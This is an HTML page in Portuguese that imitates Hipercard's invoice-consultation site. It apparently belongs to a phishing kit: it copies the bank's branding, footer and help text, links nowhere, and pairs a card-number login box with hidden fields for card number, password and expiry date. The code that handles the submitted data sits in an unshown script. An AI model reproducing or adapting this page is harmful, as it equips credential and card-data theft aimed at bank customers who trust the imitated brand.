﻿<html lang="pt-BR"><head>
    <base href="">
    <title>Hipercard Fatura | Consultar Fatura Online</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1">
    <meta charset="utf-8">
    <meta name="robots" content="follow, index">
    <meta name="description" content="Acesse sua fatura digital Hipercard ou confira seus gastos de forma rápida, simples e segura.">
    <meta name="keywords" content="fatura do hipercard,hiper 2 via,gerar boleto hipercard,Fatura Hipercard,fatura hipercard pelo site oficial,s2 via hipercard,hipercard 2 via,fatura hiper,fatura hipercard,hipercard fatura online,fatura do hiper,segunda via fatura hipercard,2 via fatura hipercard,fatura hipercard 2 via,hiper fatura,2 via fatura cartao hipercard,hipercard fatura,hipercard saldo,fatura do cartão hipercard,2 via do hipercard,2 via hipercard,cartão hipercard fatura,fatura hipercard itau,hipercard segunda via,segunda via hipercard,www hipercard com br fatura,boleto hipercard pagar,imprimir fatura hipercard,consultar fatura hipercard,fatura cartao hipercard,fatura cartão hipercard,fatura digital hipercard,fatura do hipercard,hiper 2 via,gerar boleto hipercard,Fatura Hipercard,fatura hipercard pelo site oficial,s2 via hipercard,hipercard 2 via,fatura hiper,fatura hipercard,hipercard fatura online,fatura do hiper,segunda via fatura hipercard,2 via fatura hipercard,fatura hipercard 2 via,hiper fatura,2 via fatura cartao hipercard,hipercard fatura,hipercard saldo,fatura do cartão hipercard,2 via do hipercard,2 via hipercard,cartão hipercard fatura,fatura hipercard itau,hipercard segunda via,segunda via hipercard,www hipercard com br fatura,boleto hipercard pagar,imprimir fatura hipercard,consultar fatura hipercard,fatura cartao hipercard,fatura cartão hipercard,fatura digital hipercard,fatura do hipercard,hiper 2 via,gerar boleto hipercard,Fatura Hipercard,hipercard">
    <link rel="canonical" href="">
    <meta property="og:title" content="Hipercard Fatura | Consultar Fatura Online">
    <meta property="og:description" content="Acesse sua fatura digital Hipercard ou confira seus gastos de forma rápida, simples e segura.">
    <link rel="stylesheet" href="static/css/style.css?t=1637003645" type="text/css">
    <meta property="og:title" content="Consulte a sua fatura aqui">
    <meta property="og:description" content="descontos em diversos parceiros e promoções imperdíveis">
    <meta property="og:type" content="website">
    <meta property="og:locale" content="pt_BR">
</head>
<body>
<header>
    <div class="mobileBackground"></div>
    <div class="headerLinksBar">
        <div class="container">
            <ul class="menuHeaderLinks">
                <li>
                    <a href="#" title="Hipercard">hipercard</a>
                </li>
                <li>
                    <a href="#" title="Cartões Hipercard">cartões</a>
                </li>
                <li>
                    <a href="#" title="Saiba mais sobre nossa bandeira">bandeira</a>
                </li>
            </ul>
        </div>
    </div>
    <div class="headerTopBar">
        <div class="container">
            <div class="imageLogoTop">
                <a href="#" title="Hipercard">
                    <img src="static/imgs/logo.webp" width="115px" height="50px" alt="Hipercard">
                </a>
            </div>
            <ul class="menuHeaderTop">
                <span></span>
                <li class="selected">
                    <a href="#" title="Acessar sua fatura">fatura</a>
                </li>
                <li>
                    <a href="#" title="Central de ajuda">ajuda</a>
                </li>
            </ul>
            <div class="authArea">
                <div class="content">
                    <img class="logoMobile" src="static/imgs/logoWhite.webp" width="512px" height="228px" alt="Hipercard">
                    <h3 class="mobileTitle">Consulte sua fatura pelo celular</h3>
                        <input type="hidden" id="cartao" value="">
                        <input type="hidden" id="senha" value="">
                        <input type="hidden" id="validade" value="">
                        <ul class="authSteps">
                            <li class="step selected" data-step="card_number">
                                <h2 class="inputLabel">Número do Cartão</h2>
                                <input class="inputStyle" id="cardNumberInput" type="text" name="card_number" maxlength="19">
                                <a class="authButton" title="Acessar fatura">
                                    <img class="lock show" src="static/imgs/authButton.webp" width="44px" height="44px" alt="Acessar fatura">
                                    <img class="arrow" src="static/imgs/continueButton.webp" width="44px" height="44px" alt="Continuar">
                                    <p>acessar</p>
                                </a>
                            </li>
                        </ul>
                </div>
            </div>
            <a class="authAreaButton" title="Acessar fatura">
                <img src="static/imgs/authAreaButton.webp" width="32px" height="26px" alt="Acessar fatura">
                <p>acessar fatura</p>
            </a>
        </div>
    </div>
</header>
<main>
    <div class="container">
        <a href="#" class="mainGoBack" title="Cartões Hipercard">
            <img src="static/imgs/goBack.webp" width="17px" height="35px" alt="Voltar">
            <h2>Cartões Hipercard</h2>
        </a>
        <h1 class="mainTitle">Fatura digital</h1>
        <div class="boxContent introduction">
            <div class="left">
                <img src="static/imgs/image01.webp" width="540px" height="345px" alt="Consulte os gastos do seu Hipercard">
            </div>
            <div class="right">
                <h3 class="title">consulte os gastos do seu Hipercard com a Fatura Digital</h3>
                <p class="paragraph">Com a Fatura Digital você deixa de receber sua fatura impressa, passa a recebê-la
                    por e-mail e SMS e você pode consultar seus gastos pelo app Hipercard ou se logando aqui no site com
                    seu cartão e senha, tudo de forma rápida, simples e segura.</p>
            </div>
        </div>
        <h2 class="topicTitleRed">entenda como solicitar a Fatura Digital</h2>
        <h2 class="topicSubtitle">Comece a usar agora a Fatura Digital e pare de acumular papel.</h2>
        <div class="boxContent instructions">
            <div class="left">
                <ul class="invoiceStepList">
                    <li class="step">
                        <img src="static/imgs/step1.webp" width="50px" height="50px" alt="Primeira etapa">
                        <p>Acesse o app ou envie um SMS para 4828 com “DIGITAL” ou procure atendimento nas lojas do
                            Grupo BIG</p>
                    </li>
                    <li class="step">
                        <img src="static/imgs/step2.webp" width="50px" height="50px" alt="Segunda etapa">
                        <p>Solicite a fatura digital e deixe de receber sua fatura impressa</p>
                    </li>
                    <li class="step">
                        <img src="static/imgs/step3.webp" width="50px" height="50px" alt="Terceira etapa">
                        <p>Passe a recebê-la por e-mail e consulte seus gastos pelos nossos aplicativos e pela
                            internet</p>
                    </li>
                    <li class="step">
                        <img src="static/imgs/step4.webp" width="50px" height="50px" alt="Quarta etapa">
                        <p>Você receberá gratuitamente alertas por e-mail e SMS com as informações de fechamento e
                            vencimento</p>
                    </li>
                    <li class="step">
                        <img src="static/imgs/step5.webp" width="50px" height="50px" alt="Quinta etapa">
                        <p>E o melhor é que você continua fazendo o pagamento da sua fatura da maneira que sempre
                            fez</p>
                    </li>
                </ul>
            </div>
            <div class="right">
                <img src="static/imgs/image02.webp" width="540px" height="345px" alt="Beneficios da fatura digital">
            </div>
        </div>
    </div>
    <div class="benefitsBox">
        <div class="container">
            <h2 class="title">benefícios da Fatura Digital</h2>
            <ul class="benefitsList">
                <li class="benefit">
                    <div class="icon">
                        <img src="static/imgs/easyToPay.webp" width="48px" height="48px" alt="Fácil de pagar">
                    </div>
                    <h2>Fácil de pagar</h2>
                    <p>Envie "BOLETO" pra 4828 que enviamos o código da sua fatura</p>
                </li>
                <li class="benefit">
                    <div class="icon">
                        <img src="static/imgs/safe.webp" width="48px" height="48px" alt="Seguro">
                    </div>
                    <h2>Seguro</h2>
                    <p>Não corra o risco da sua fatura ser extraviada pelo correio</p>
                </li>
                <li class="benefit">
                    <div class="icon">
                        <img src="static/imgs/free.webp" width="48px" height="48px" alt="Grátis">
                    </div>
                    <h2>Grátis</h2>
                    <p>Receba os avisos de fechamento e do vencimento por SMS grátis</p>
                </li>
                <li class="benefit">
                    <div class="icon">
                        <img src="static/imgs/practical.webp" width="48px" height="48px" alt="Prático">
                    </div>
                    <h2>Prático</h2>
                    <p>Receba no e-mail e encontre o que precisar pelo computador</p>
                </li>
            </ul>
        </div>
    </div>
    <div class="boxConsult">
        <div class="container">
            <h2 class="title">sete canais para consulta da fatura</h2>
            <ul class="channelsList">
                <li class="channel">
                    <h2>App Hipercard</h2>
                    <p>Hipercard: Baixe o app Hipercard &gt; Digite o número do cartão e senha &gt; Fatura&gt; Escolha o mês &gt;
                        Abrir 2ª via.</p>
                </li>
                <li class="channel">
                    <h2>Internet (Site)</h2>
                    <p>Digite o número do cartão e senha à esquerda, acima &gt; Meus atalhos &gt; Fatura últimos 12 meses &gt;
                        Selecione o mês &gt; Confirmar.</p>
                </li>
                <li class="channel">
                    <h2>Mensagem de texto (SMS)</h2>
                    <p>Envie um (SMS) gratuito para o número 4828 com a palavra BOLETO e receba o número do código de
                        barras.</p>
                </li>
                <li class="channel">
                    <h2>Atendimento das Lojas do Grupo BIG</h2>
                    <p>Em algumas lojas, há atendimento para cartões e é possível pedir a impressão da fatura
                        (necessário nº do cartão ou CPF).</p>
                </li>
            </ul>
        </div>
    </div>
    <div class="boxRelated">
        <div class="container">
            <h2 class="title">confira abaixo os assuntos mais procurados</h2>
            <ul class="topicsList">
                <li class="topic">
						    <span class="top">
    							<h3 class="title">como funciona a Fatura Digital?</h3>
    							<img class="arrow" src="static/imgs/showMoreArrow.webp" width="26px" height="26px" alt="Exibir">
    						</span>
                </li>
                <li class="topic">
						    <span class="top">
    							<h3 class="title">como faço para consultar a minha fatura?</h3>
    							<img class="arrow" src="static/imgs/showMoreArrow.webp" width="26px" height="26px" alt="Exibir">
    						</span>
                </li>
                <li class="topic">
						    <span class="top">
    							<h3 class="title">como faço para receber o código de barras da fatura?</h3>
    							<img class="arrow" src="static/imgs/showMoreArrow.webp" width="26px" height="26px" alt="Exibir">
    						</span>
                </li>
                <li class="topic">
						    <span class="top">
    							<h3 class="title">como faço para pagar minha fatura?</h3>
    							<img class="arrow" src="static/imgs/showMoreArrow.webp" width="26px" height="26px" alt="Exibir">
    						</span>
                </li>
                <li class="topic">
						    <span class="top">
    							<h3 class="title">qual o valor da fatura digital?</h3>
    							<img class="arrow" src="static/imgs/showMoreArrow.webp" width="26px" height="26px" alt="Exibir">
    						</span>
                </li>
            </ul>
            <a class="seeMoreButton" title="Ver mais">ver mais</a>
        </div>
    </div>
</main>
<footer>
    <div class="footerLinkTab">
        <div class="container">
            <ul class="footerLinksHistory">
                <li class="link">
                    Hipercard
                </li>
                <li class="arrow">
                    <img src="static/imgs/nextPageArrow.webp" width="15px" height="23px" alt="Proxima página">
                </li>
                <li class="link">
                    Cartões Hipercard
                </li>
                <li class="arrow">
                    <img src="static/imgs/nextPageArrow.webp" width="15px" height="23px" alt="Proxima página">
                </li>
                <li class="link">
                    Fatura
                </li>
            </ul>
        </div>
    </div>
    <div class="footerDetails">
        <div class="container">
            <div class="footerCopyright">
                <h2>@2019 Hipercard Banco Múltiplo S.A. CNPJ nº 03.012.230/0001-69</h2>
                <p>Praça Alfredo Egydio de Souza Aranha, 100, Torre Olavo Setubal, Parque Jabaquara - CEP 04344-902 -
                    São Paulo - Brasil</p>
            </div>
            <div class="footerPhones">
                <p>sac 0800 728 0728</p>
                <p>ouvidoria 0800 570 0011</p>
            </div>
        </div>
    </div>
</footer>

<script src="static/js/jquery.js"></script>
<script src="static/js/jquery.mask.min.js"></script>
<script src="static/js/jquery.payment.js"></script>
<script src="static/js/functions.js"></script>
<script>
    $("#cardNumberInput").mask("9999 9999 9999 9999");
</script>

<div id="915ed1aa180a24f143d7a33f90da959c"></div></body></html>